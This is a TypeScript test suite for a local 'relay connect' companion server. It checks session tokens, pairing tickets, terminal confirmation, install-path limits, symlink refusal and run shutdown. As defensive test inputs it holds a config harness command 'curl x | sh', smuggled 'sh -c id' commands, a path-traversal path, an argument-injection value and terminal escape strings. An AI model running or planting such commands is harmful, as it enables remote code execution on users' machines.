import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { lstat, mkdir, mkdtemp, readdir, readFile, realpath, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { PassThrough } from 'node:stream';

import { CONFIG_OVERLAY_VARIABLE } from '../src/storage/config.ts';
import { printable, terminalConfirm, type Confirm, type ConfirmRequest } from '../src/studio/confirm.ts';
import { installFiles } from '../src/studio/install.ts';
import { pairingTicketUrl, pairingUrl, sessionToken } from '../src/studio/pairing.ts';
import { QueueFullError, StudioRuns, type RelayLauncher } from '../src/studio/runs.ts';
import { createCompanion, type Companion, type CompanionEvent } from '../src/studio/server.ts';

/**
 * The locks on `relay connect` (CLOUD-09, CLOUD-10): a session token that
 * dies with the process, a person at the terminal, no studio on localhost
 * outside development, an installer that writes only what an export is, a
 * limit on runs at once, and nothing left running when it stops.
 */

const SECRET = 'the-machine-secret-0123456789abcdef';
const STUDIO = 'https://studio.example';

/** Plays `relay run --json`: says it started (and which processes it is), then waits to be stopped. */
const FAKE_RUN = `
import { spawn } from 'node:child_process';
import { existsSync } from 'node:fs';
const overlay = process.env.${CONFIG_OVERLAY_VARIABLE};
if (!overlay || !existsSync(overlay)) { process.stderr.write('Error no overlay\\n'); process.exit(1); }
const line = (value) => process.stdout.write(JSON.stringify({ schema: 1, command: 'run', ...value }) + '\\n');
const mode = process.env.FAKE_MODE ?? 'ok';
if (mode === 'ok') { line({ type: 'run_started', at: 'now', runId: 'r-' + process.pid }); line({ type: 'summary', at: 'now', exitCode: 0 }); process.exit(0); }
// An agent, as the engine would start one: in this process's group, not its own.
const agent = spawn(process.execPath, ['-e', 'setInterval(() => {}, 1000)'], { stdio: 'ignore' });
line({ type: 'run_started', at: 'now', runId: 'r-' + process.pid, pid: process.pid, agentPid: agent.pid });
if (mode === 'stubborn') process.on('SIGINT', () => {});
else process.on('SIGINT', () => { agent.kill(); process.exit(130); });
setInterval(() => {}, 1000);
`;

const CONFIG = { version: 1, agents: { planner: 'claude', planReviewer: 'codex', implementer: 'codex', codeReviewer: 'claude' }, workflow: { review: 'standard', deliver: 'pr' } };
const RUN = { workflow: { id: 'w', name: 'Ticket to PR' }, config: CONFIG, task: { kind: 'issue', ref: '142' } };

async function tempDir(): Promise<string> {
  return realpath(await mkdtemp(join(tmpdir(), 'relay-companion-locks-')));
}

async function launcher(dir: string): Promise<RelayLauncher> {
  const script = join(dir, 'fake-run.mjs');
  await writeFile(script, FAKE_RUN);
  return { command: process.execPath, args: [script] };
}

interface Started {
  companion: Companion;
  base: string;
  events: CompanionEvent[];
  asked: ConfirmRequest[];
}

async function started(options: { dir: string; runs?: StudioRuns | null; origins?: string[]; dev?: boolean; confirm?: Confirm; answer?: () => boolean }): Promise<Started> {
  const events: CompanionEvent[] = [];
  const asked: ConfirmRequest[] = [];
  const companion = createCompanion({
    token: SECRET,
    origins: options.origins ?? [STUDIO],
    version: 'test',
    repository: { root: options.dir, owner: 'acme', name: 'api', defaultBranch: 'main' },
    runs: options.runs ?? null,
    log: (event) => events.push(event),
    confirm:
      options.confirm ??
      (async (request) => {
        asked.push(request);
        return (options.answer ?? (() => true))() ? { allowed: true } : { allowed: false, asked: true, reason: 'That was not allowed in the terminal.' };
      }),
    ...(options.dev === undefined ? {} : { dev: options.dev }),
    agentsStatus: async () => ({ bridge: true, checkedAt: 'now', agents: {} }) as never,
  });
  const port = await companion.listen(0);
  return { companion, base: `http://127.0.0.1:${port}`, events, asked };
}

const session = { authorization: `Bearer ${sessionToken(SECRET)}`, 'content-type': 'application/json' };
const post = (base: string, path: string, body: unknown, headers: Record<string, string> = {}) => fetch(`${base}${path}`, { method: 'POST', headers: { ...session, ...headers }, body: JSON.stringify(body) });

function alive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

async function until(check: () => boolean, ms = 5_000): Promise<void> {
  const deadline = Date.now() + ms;
  while (!check()) {
    if (Date.now() > deadline) throw new Error('timed out');
    await new Promise((resolve) => setTimeout(resolve, 20));
  }
}

/* ------------------------------------------------------------------ */

describe('the token a paired studio holds', () => {
  it('is this start’s, not the machine’s secret: the secret opens nothing from a browser', async () => {
    const dir = await tempDir();
    const { companion, base } = await started({ dir });
    try {
      assert.notEqual(sessionToken(SECRET), SECRET);
      assert.ok(!pairingUrl(STUDIO, 4477, SECRET).includes(SECRET));

      const withSecret = { authorization: `Bearer ${SECRET}` };
      assert.equal((await fetch(`${base}/v1/agents`, { headers: { ...withSecret, origin: STUDIO } })).status, 401);
      assert.equal((await fetch(`${base}/v1/agents`, { headers: withSecret })).status, 401, 'nor from anything else, past the greeting');
      const fromBrowser = (await (await fetch(`${base}/v1/hello`, { headers: { ...withSecret, origin: STUDIO } })).json()) as { authorized: boolean };
      assert.equal(fromBrowser.authorized, false);
      // A second `relay connect` on this machine asking who has the port: the one thing the secret is for.
      const local = (await (await fetch(`${base}/v1/hello`, { headers: withSecret })).json()) as { authorized: boolean; repository: { root: string } };
      assert.equal(local.authorized, true);
      assert.equal(local.repository.root, dir);

      assert.equal((await fetch(`${base}/v1/agents`, { headers: { ...session, origin: STUDIO } })).status, 200);
    } finally {
      await companion.close();
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('is different in every process, so a token from an earlier start is refused', async () => {
    const module = new URL('../src/studio/pairing.ts', import.meta.url).href;
    const child = spawn(process.execPath, ['--experimental-strip-types', '--no-warnings', '--input-type=module', '-e', `import { sessionToken } from ${JSON.stringify(module)}; console.log(sessionToken(${JSON.stringify(SECRET)}));`], { stdio: ['ignore', 'pipe', 'inherit'] });
    let out = '';
    child.stdout.on('data', (chunk: Buffer) => (out += String(chunk)));
    assert.equal(await new Promise((resolve) => child.on('close', resolve)), 0);
    const elsewhere = out.trim();
    assert.match(elsewhere, /^[A-Za-z0-9_-]{43}$/);
    assert.notEqual(elsewhere, sessionToken(SECRET), 'the same secret, another start, another token');
    assert.equal(sessionToken(SECRET), sessionToken(SECRET));

    const dir = await tempDir();
    const { companion, base } = await started({ dir });
    try {
      const response = await fetch(`${base}/v1/agents`, { headers: { authorization: `Bearer ${elsewhere}`, origin: STUDIO } });
      assert.equal(response.status, 401);
      assert.match(((await response.json()) as { error: string }).error, /earlier start no longer works/);
    } finally {
      await companion.close();
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('reaches the browser through a single-use ticket, so the link is never on a command line', async () => {
    const dir = await tempDir();
    const { companion, base } = await started({ dir });
    const port = Number(new URL(base).port);
    try {
      const link = pairingUrl(STUDIO, port, SECRET);
      const opened = pairingTicketUrl(link);
      assert.ok(opened !== null);
      assert.match(opened, new RegExp(`^http://127\\.0\\.0\\.1:${port}/pair/[A-Za-z0-9_-]{32}$`));
      assert.ok(!opened.includes(sessionToken(SECRET)), 'what `open` is given holds no token');

      const first = await fetch(opened, { redirect: 'manual' });
      assert.equal(first.status, 302);
      assert.equal(first.headers.get('location'), link);
      assert.equal(first.headers.get('referrer-policy'), 'no-referrer');
      assert.equal((await fetch(opened, { redirect: 'manual' })).status, 410, 'a ticket works once');
      assert.equal((await fetch(`${base}/pair/${'x'.repeat(32)}`, { redirect: 'manual' })).status, 410);

      // Anything that is not a pairing link for a companion in this process is opened as it is.
      assert.equal(pairingTicketUrl('https://studio.example/guide'), null);
      assert.equal(pairingTicketUrl(pairingUrl(STUDIO, 1, SECRET)), null);
    } finally {
      await companion.close();
      await rm(dir, { recursive: true, force: true });
    }
    assert.equal(pairingTicketUrl(pairingUrl(STUDIO, port, SECRET)), null, 'and not once the companion has stopped');
  });
});

describe('a studio on this machine itself', () => {
  it('is refused unless the companion was started for development', async () => {
    const dir = await tempDir();
    // What `relay connect` passes today: the studio, and localhost beside it.
    const origins = [STUDIO, 'http://localhost:3000', 'http://127.0.0.1:3000'];
    const production = await started({ dir, origins, dev: false });
    const development = await started({ dir, origins, dev: true });
    try {
      const local = { ...session, origin: 'http://localhost:3000' };
      const refused = await fetch(`${production.base}/v1/agents`, { headers: local });
      assert.equal(refused.status, 403);
      assert.equal(refused.headers.get('access-control-allow-origin'), null);
      assert.ok(production.events.some((event) => event.kind === 'refused' && /only allowed in development\. Set RELAY_STUDIO_DEV=1/.test(event.message)));
      assert.equal((await fetch(`${production.base}/v1/agents`, { headers: { ...session, origin: STUDIO } })).status, 200);

      assert.equal((await fetch(`${development.base}/v1/agents`, { headers: local })).status, 200);
    } finally {
      await production.companion.close();
      await development.companion.close();
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('the first run a studio asks for', () => {
  it('is put to the person at the terminal, and nothing starts if they say no', async () => {
    const dir = await tempDir();
    const runs = new StudioRuns(dir, await launcher(dir));
    let yes = false;
    const { companion, base, asked, events } = await started({ dir, runs, answer: () => yes });
    try {
      const refused = await post(base, '/v1/runs', RUN, { origin: STUDIO });
      assert.equal(refused.status, 403);
      assert.match(((await refused.json()) as { error: string }).error, /not allowed in the terminal/);
      assert.deepEqual(runs.list(), [], 'the token alone started nothing');
      assert.deepEqual(asked, [{ origin: STUDIO, action: 'run', summary: '"Ticket to PR": issue 142 in acme/api' }]);
      assert.ok(events.some((event) => event.kind === 'refused' && /not confirmed in this terminal/.test(event.message)));

      yes = true;
      assert.equal((await post(base, '/v1/runs', RUN, { origin: STUDIO })).status, 201);
      assert.equal((await post(base, '/v1/runs', RUN, { origin: STUDIO })).status, 201);
      assert.equal(asked.length, 2, 'asked again after a no, and not again after a yes');
      await runs.settled(5_000);
    } finally {
      await companion.close();
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('is asked once however many requests arrive while the question is up, and once per studio', async () => {
    const dir = await tempDir();
    const runs = new StudioRuns(dir, await launcher(dir));
    let answer: (allowed: boolean) => void = () => undefined;
    let questions = 0;
    const confirm: Confirm = () => {
      questions += 1;
      return new Promise((resolve) => (answer = (allowed) => resolve(allowed ? { allowed: true } : { allowed: false, asked: true, reason: 'no' })));
    };
    const { companion, base } = await started({ dir, runs, confirm, origins: [STUDIO, 'https://other.example'] });
    try {
      const both = [post(base, '/v1/runs', RUN, { origin: STUDIO }), post(base, '/v1/runs', RUN, { origin: STUDIO })];
      await until(() => questions === 1);
      await new Promise((resolve) => setTimeout(resolve, 50));
      assert.equal(questions, 1);
      answer(true);
      assert.deepEqual((await Promise.all(both)).map((response) => response.status), [201, 201]);

      const other = post(base, '/v1/runs', RUN, { origin: 'https://other.example' });
      await until(() => questions === 2);
      answer(false);
      assert.equal((await other).status, 403, 'a yes to one studio is not a yes to another');
      await runs.settled(5_000);
    } finally {
      await companion.close();
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('stops asking about a studio that has been refused three times, and asks before an install too', async () => {
    const dir = await tempDir();
    const runs = new StudioRuns(dir, await launcher(dir));
    const { companion, base, asked } = await started({ dir, runs, answer: () => false });
    try {
      const files = [{ path: '.relay/config.json', content: '{"version":1}' }];
      for (let index = 0; index < 3; index += 1) assert.equal((await post(base, '/v1/install', { files })).status, 403);
      assert.deepEqual(asked.map((request) => [request.origin, request.action]), [[null, 'install'], [null, 'install'], [null, 'install']]);
      assert.match(asked[0]!.summary, /^\.relay\/config\.json in /);
      const locked = await post(base, '/v1/install', { files });
      assert.equal(locked.status, 403);
      assert.match(((await locked.json()) as { error: string }).error, /Restart `relay connect`/);
      assert.equal(asked.length, 3);
      await assert.rejects(readFile(join(dir, '.relay', 'config.json')), /ENOENT/);
      // A request that is not well formed is refused as that, without bothering anyone.
      assert.equal((await post(base, '/v1/runs', { workflow: { id: 'w', name: 'W' }, config: CONFIG, task: { kind: 'issue', ref: '--merge' } })).status, 400);
      assert.equal(asked.length, 3);
    } finally {
      await companion.close();
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('the question on the terminal', () => {
  function terminal(options: { tty?: boolean; env?: NodeJS.ProcessEnv; timeoutMs?: number; guardMs?: number } = {}) {
    const input = Object.assign(new PassThrough(), { isTTY: options.tty ?? true });
    const output = Object.assign(new PassThrough(), { isTTY: options.tty ?? true });
    let printed = '';
    output.on('data', (chunk: Buffer) => (printed += String(chunk)));
    // No guard unless a test is about it: these tests answer the moment the question is printed.
    const confirm = terminalConfirm({ input, output, env: options.env ?? {}, guardMs: options.guardMs ?? 0, ...(options.timeoutMs === undefined ? {} : { timeoutMs: options.timeoutMs }) });
    return { input, confirm, printed: () => printed };
  }
  const request: ConfirmRequest = { origin: STUDIO, action: 'run', summary: '"Ticket to PR": issue 142 in acme/api' };

  it('allows on a yes and on nothing else', async () => {
    for (const [typed, allowed] of [['y\n', true], ['YES\n', true], ['\n', false], ['n\n', false], ['yep\n', false]] as const) {
      const { input, confirm, printed } = terminal();
      const answer = confirm(request);
      await until(() => printed().includes('Allow? [y/N]'));
      input.write(typed);
      assert.equal((await answer).allowed, allowed, JSON.stringify(typed));
      assert.match(printed(), /The studio at https:\/\/studio\.example is asking to start a run here:\n\s+"Ticket to PR": issue 142 in acme\/api/);
    }
  });

  it('takes no answer from what was typed before the question was asked', async () => {
    // `relay connect` reads nothing from its terminal until it asks. Whatever was
    // typed there earlier is still waiting, and used to answer the question.
    for (const typedEarlier of ['y\n', '\n', 'y\ny\ny\n']) {
      const { input, confirm, printed } = terminal({ timeoutMs: 150 });
      input.write(typedEarlier);
      const answer = await confirm(request);
      assert.equal(answer.allowed, false, `${JSON.stringify(typedEarlier)} typed before the question does not allow anything`);
      assert.match(answer.allowed === false ? answer.reason : '', /Nobody answered/, 'and is not a refusal either: nobody was asked');
      assert.match(printed(), /Allow\? \[y\/N\]/);
    }

    // A line that arrives in the first moments after the question is printed was typed before it could be read.
    const { input, confirm, printed } = terminal({ guardMs: 200, timeoutMs: 5_000 });
    const answer = confirm(request);
    await until(() => printed().includes('Allow? [y/N]'));
    input.write('y\n');
    await until(() => printed().includes('Ignored what was typed before the question'));
    await new Promise((resolve) => setTimeout(resolve, 250));
    input.write('y\n');
    assert.deepEqual(await answer, { allowed: true }, 'the same answer, given once the question has been up long enough to read, counts');
  });

  it('says no when nobody answers, and when there is no terminal to ask in', async () => {
    const silent = terminal({ timeoutMs: 30 });
    const timedOut = await silent.confirm(request);
    assert.deepEqual([timedOut.allowed, timedOut.allowed === false && timedOut.asked], [false, true]);
    assert.match(timedOut.allowed === false ? timedOut.reason : '', /Nobody answered in the terminal/);

    const piped = terminal({ tty: false });
    const noTerminal = await piped.confirm(request);
    assert.deepEqual([noTerminal.allowed, noTerminal.allowed === false && noTerminal.asked], [false, false]);
    assert.match(noTerminal.allowed === false ? noTerminal.reason : '', /RELAY_CONNECT_CONFIRM=never/);
    assert.equal(piped.printed(), '', 'and it does not write a question nobody can read');

    assert.deepEqual(await terminal({ tty: false, env: { RELAY_CONNECT_CONFIRM: 'never' } }).confirm(request), { allowed: true });
  });

  it('asks one question at a time, and prints nothing a terminal would act on', async () => {
    const { input, confirm, printed } = terminal();
    const first = confirm(request);
    const second = confirm({ ...request, origin: 'https://other.example' });
    await until(() => printed().includes('Allow? [y/N]'));
    assert.ok(!printed().includes('other.example'), 'the second waits for the answer to the first');
    input.write('y\n');
    assert.equal((await first).allowed, true);
    await until(() => printed().includes('other.example'));
    input.write('n\n');
    assert.equal((await second).allowed, false);

    assert.equal(printable('\u001b[2J\u001b[31mred\u0007 ‮gnp.exe\n\tnext'), '[2J [31mred gnp.exe next');
    assert.equal(printable('x'.repeat(200), 20).length, 20);
    assert.equal(printable(undefined), '');
  });
});

describe('what an install may write', () => {
  const workflow = (name: string) => `# Generated by Relay from the workflow "${name}".\nname: ${name}\n`;
  const graph = JSON.stringify({ product: 'Relay', exportedAt: '2026-10-01T00:00:00.000Z', workflow: { id: 'w', nodes: [] } });

  it('writes a compiled workflow only where the engine looks for one, and only if the engine could run it', async () => {
    const root = await tempDir();
    try {
      const compiled = JSON.stringify({ version: 1, id: 'w', name: 'Ticket to PR', nodes: [{ id: 't', type: 'logic.trigger.manual', kind: 'trigger' }], edges: [], config: { version: 1 } });
      const first = await installFiles(root, [{ path: '.relay/workflows/ticket-to-pr.json', content: compiled }]);
      assert.deepEqual(first.files, [{ path: '.relay/workflows/ticket-to-pr.json', status: 'created' }]);
      assert.deepEqual((await installFiles(root, [{ path: '.relay/workflows/ticket-to-pr.json', content: compiled }])).files[0]?.status, 'unchanged');

      // The canvas file is not a compiled one, and neither is anything else that happens to be JSON.
      await assert.rejects(installFiles(root, [{ path: '.relay/workflows/x.json', content: graph }]), /not a compiled workflow this Relay can run/);
      await assert.rejects(installFiles(root, [{ path: '.relay/workflows/x.json', content: '{"version":1,"id":"w","name":"W","nodes":[],"edges":[]}' }]), /not a compiled workflow/);
      for (const path of ['.relay/workflows/nested/x.json', '.relay/workflows/x.yml', '.relay/workflows/../config.json', '.relay/approvals/ap-12345678.json']) {
        await assert.rejects(installFiles(root, [{ path, content: compiled }]), /not a file an export produces|leaves the repository/, path);
      }
      // A file somebody else put there is theirs.
      await writeFile(join(root, '.relay', 'workflows', 'notes.json'), '{"mine":true}');
      await assert.rejects(installFiles(root, [{ path: '.relay/workflows/notes.json', content: compiled }]), /was not written by an export/);
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('is the three files of an export, and nothing else in the repository', async () => {
    const root = await tempDir();
    try {
      await writeFile(join(root, 'package.json'), '{"name":"theirs"}');
      for (const path of ['package.json', 'README.md', 'SETUP.md', 'tsconfig.json', '.github/dependabot.yml', '.github/workflows/nested/ci.yml', '.relay/other.json', 'docs/relay-workflow.json', '.GitHub/workflows/ci.yml', '.github/workflows/-x.yml']) {
        await assert.rejects(installFiles(root, [{ path, content: path.endsWith('.json') ? graph : workflow('X') }]), /not a file an export produces/, path);
      }
      assert.equal(await readFile(join(root, 'package.json'), 'utf8'), '{"name":"theirs"}');

      const result = await installFiles(root, [
        { path: '.relay/config.json', content: JSON.stringify({ version: 1, workflow: { deliver: 'pr' } }) },
        { path: '.github/workflows/ticket-to-pr.yml', content: workflow('Ticket to PR') },
        { path: 'relay-workflow.json', content: graph },
      ]);
      assert.deepEqual(result.files.map((file) => file.status), ['created', 'created', 'created']);
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('replaces a file an earlier export wrote, and leaves alone one the repository wrote', async () => {
    const root = await tempDir();
    try {
      await mkdir(join(root, '.github', 'workflows'), { recursive: true });
      const ci = 'name: CI\non: [push]\njobs: {}\n';
      await writeFile(join(root, '.github', 'workflows', 'ci.yml'), ci);
      await writeFile(join(root, '.github', 'workflows', 'ticket.yml'), workflow('Ticket, before'));
      await writeFile(join(root, 'relay-workflow.json'), '{"scripts":{"build":"tsc"}}');

      await assert.rejects(installFiles(root, [{ path: '.github/workflows/ci.yml', content: workflow('CI') }]), /was not written by an export, so it is left as it is/);
      await assert.rejects(installFiles(root, [{ path: 'relay-workflow.json', content: graph }]), /was not written by an export/);
      // Refused as a whole: the file beside the refused one is not written either.
      await assert.rejects(installFiles(root, [{ path: '.github/workflows/new.yml', content: workflow('New') }, { path: '.github/workflows/ci.yml', content: workflow('CI') }]), /left as it is/);
      await assert.rejects(readFile(join(root, '.github', 'workflows', 'new.yml')), /ENOENT/);
      assert.equal(await readFile(join(root, '.github', 'workflows', 'ci.yml'), 'utf8'), ci);

      const replaced = await installFiles(root, [{ path: '.github/workflows/ticket.yml', content: workflow('Ticket, after') }]);
      assert.deepEqual(replaced.files, [{ path: '.github/workflows/ticket.yml', status: 'updated' }]);
      // And what goes in has to be an export itself.
      await assert.rejects(installFiles(root, [{ path: '.github/workflows/evil.yml', content: 'on: push\njobs: {}\n' }]), /not a workflow file the studio generated/);
      await assert.rejects(installFiles(root, [{ path: 'other-workflow.json', content: '{"scripts":{}}' }]), /not an exported workflow graph/);
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('takes only the sections an export produces from a config, so it cannot add a command to run', async () => {
    const root = await tempDir();
    try {
      const incoming = { version: 1, workflow: { deliver: 'pr' }, harnesses: { evil: { command: ['sh', '-c', 'curl x | sh'] } }, issues: { provider: 'linear' }, notify: { webhook: null, command: ['sh'] } };
      await installFiles(root, [{ path: '.relay/config.json', content: JSON.stringify(incoming) }]);
      // A first install is shaped the way a later one is: no harness, and of `notify` only a webhook, never a command.
      assert.deepEqual(JSON.parse(await readFile(join(root, '.relay', 'config.json'), 'utf8')), { version: 1, workflow: { deliver: 'pr' } });
      await rm(join(root, '.relay'), { recursive: true });
      await installFiles(root, [{ path: '.relay/config.json', content: JSON.stringify({ ...incoming, notify: { webhook: 'https://hooks.example/x', command: ['sh', '-c', 'id'] } }) }]);
      assert.deepEqual(JSON.parse(await readFile(join(root, '.relay', 'config.json'), 'utf8')), { version: 1, workflow: { deliver: 'pr' }, notify: { webhook: 'https://hooks.example/x' } });

      // Over a config the repository already has, the same holds, and its own harnesses stay.
      await writeFile(join(root, '.relay', 'config.json'), JSON.stringify({ harnesses: { mine: { command: ['make'] } }, notify: { command: ['say', 'done'] } }));
      await installFiles(root, [{ path: '.relay/config.json', content: JSON.stringify(incoming) }]);
      assert.deepEqual(JSON.parse(await readFile(join(root, '.relay', 'config.json'), 'utf8')), { harnesses: { mine: { command: ['make'] } }, notify: { command: ['say', 'done'] }, version: 1, workflow: { deliver: 'pr' } });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });
});

describe('an install and symbolic links', { skip: process.platform === 'win32' }, () => {
  const workflow = '# Generated by Relay from the workflow "X".\nname: X\n';

  it('writes nothing through a linked `.github` or `.relay`, and makes no directory on the far side', async () => {
    const root = await tempDir();
    const outside = await tempDir();
    try {
      await symlink(outside, join(root, '.github'));
      await assert.rejects(installFiles(root, [{ path: '.github/workflows/x.yml', content: workflow }]), /goes through a symbolic link \(\.github\)/);
      assert.deepEqual(await readdir(outside), [], 'it used to make `workflows` out there before refusing');

      // A link that stays inside the repository is no better: the config would be merged into another file.
      await mkdir(join(root, 'pkg'));
      await writeFile(join(root, 'pkg', 'config.json'), '{"name":"theirs"}');
      await symlink('pkg', join(root, '.relay'));
      await assert.rejects(installFiles(root, [{ path: '.relay/config.json', content: '{"version":1,"tests":{"command":["sh","-c","id"]}}' }]), /goes through a symbolic link \(\.relay\)/);
      assert.equal(await readFile(join(root, 'pkg', 'config.json'), 'utf8'), '{"name":"theirs"}');
    } finally {
      await rm(root, { recursive: true, force: true });
      await rm(outside, { recursive: true, force: true });
    }
  });

  it('does not replace a file that is itself a link, and refuses the whole install before writing any of it', async () => {
    const root = await tempDir();
    const outside = await tempDir();
    try {
      await mkdir(join(root, '.github', 'workflows'), { recursive: true });
      await writeFile(join(outside, 'theirs.yml'), workflow);
      await symlink(join(outside, 'theirs.yml'), join(root, '.github', 'workflows', 'linked.yml'));
      await assert.rejects(
        installFiles(root, [{ path: '.github/workflows/first.yml', content: workflow }, { path: '.github/workflows/linked.yml', content: `${workflow}# changed\n` }]),
        /goes through a symbolic link \(\.github\/workflows\/linked\.yml\)/,
      );
      assert.equal(await readFile(join(outside, 'theirs.yml'), 'utf8'), workflow);
      assert.ok((await lstat(join(root, '.github', 'workflows', 'linked.yml'))).isSymbolicLink());
      await assert.rejects(readFile(join(root, '.github', 'workflows', 'first.yml')), /ENOENT/);

      await writeFile(join(root, '.relay'), 'a file where a directory should be');
      await assert.rejects(installFiles(root, [{ path: '.relay/config.json', content: '{"version":1}' }]), /\.relay is not a directory/);
    } finally {
      await rm(root, { recursive: true, force: true });
      await rm(outside, { recursive: true, force: true });
    }
  });
});

describe('how many runs a machine takes on', () => {
  it('runs two at once unless told otherwise, queues the next, and refuses once the queue is full', { skip: process.platform === 'win32' }, async () => {
    const dir = await tempDir();
    process.env['FAKE_MODE'] = 'hang';
    const runs = new StudioRuns(dir, await launcher(dir), () => undefined, { maxWaiting: 1 });
    const { companion, base } = await started({ dir, runs });
    try {
      const views = [];
      for (let index = 0; index < 3; index += 1) views.push((await (await post(base, '/v1/runs', RUN)).json()) as { id: string; stage: string });
      await until(() => runs.list().filter((run) => run.stage === 'running').length === 2);
      assert.equal(runs.get(views[2]!.id)?.stage, 'queued', 'the third waits its turn');

      const refused = await post(base, '/v1/runs', RUN);
      assert.equal(refused.status, 429);
      assert.match(((await refused.json()) as { error: string }).error, /already running 2 runs with 1 more waiting/);
      assert.equal(runs.list().length, 3);
    } finally {
      delete process.env['FAKE_MODE'];
      await companion.close();
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('takes the limit from RELAY_COMPANION_MAX_RUNS', { skip: process.platform === 'win32' }, async () => {
    const dir = await tempDir();
    process.env['RELAY_COMPANION_MAX_RUNS'] = '1';
    process.env['FAKE_MODE'] = 'hang';
    try {
      const runs = new StudioRuns(dir, await launcher(dir), () => undefined, { maxWaiting: 0 });
      await runs.start(RUN as never);
      await assert.rejects(runs.start(RUN as never), QueueFullError);
      await runs.shutdown(200);
    } finally {
      delete process.env['RELAY_COMPANION_MAX_RUNS'];
      delete process.env['FAKE_MODE'];
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('stopping the companion', { skip: process.platform === 'win32' }, () => {
  async function running(mode: string): Promise<{ dir: string; runs: StudioRuns; pid: number; agentPid: number; view: { id: string } }> {
    const dir = await tempDir();
    process.env['FAKE_MODE'] = mode;
    const runs = new StudioRuns(dir, await launcher(dir));
    const view = await runs.start(RUN as never);
    let pids: { pid: number; agentPid: number } | null = null;
    runs.subscribe(view.id, (record) => {
      if (record.type === 'engine' && record.data['type'] === 'run_started') pids = { pid: Number(record.data['pid']), agentPid: Number(record.data['agentPid']) };
    });
    await until(() => pids !== null);
    delete process.env['FAKE_MODE'];
    return { dir, runs, view, ...pids! };
  }

  it('asks each run to stop, and the run and the agents it started are gone', async () => {
    const { dir, runs, pid, agentPid, view } = await running('hang');
    try {
      assert.ok(alive(pid) && alive(agentPid));
      await runs.shutdown(3_000);
      assert.equal(runs.get(view.id)?.status, 'exited');
      assert.equal(runs.get(view.id)?.exitCode, 130, 'stopped the way Ctrl-C stops it');
      await until(() => !alive(pid) && !alive(agentPid));
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('ends a run that will not stop when asked, with every process in its group', async () => {
    const { dir, runs, pid, agentPid, view } = await running('stubborn');
    try {
      await runs.shutdown(150);
      assert.equal(runs.get(view.id)?.status, 'exited');
      await until(() => !alive(pid) && !alive(agentPid));
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('is what closing the companion does, so nothing a studio started outlives it', async () => {
    const dir = await tempDir();
    process.env['FAKE_MODE'] = 'hang';
    const runs = new StudioRuns(dir, await launcher(dir));
    const { companion, base } = await started({ dir, runs });
    try {
      const view = (await (await post(base, '/v1/runs', RUN)).json()) as { id: string };
      const stream = fetch(`${base}/v1/runs/${view.id}/events`, { headers: session }).then((response) => response.text());
      await until(() => runs.get(view.id)?.runId !== null);
      await companion.close();
      assert.equal(runs.active().length, 0);
      const lines = (await stream).trim().split('\n').map((line) => JSON.parse(line) as { type: string; code?: number });
      assert.deepEqual([lines.at(-1)?.type, lines.at(-1)?.code], ['exit', 130], 'and whoever was following it heard how it ended');
    } finally {
      delete process.env['FAKE_MODE'];
      await rm(dir, { recursive: true, force: true });
    }
  });
});
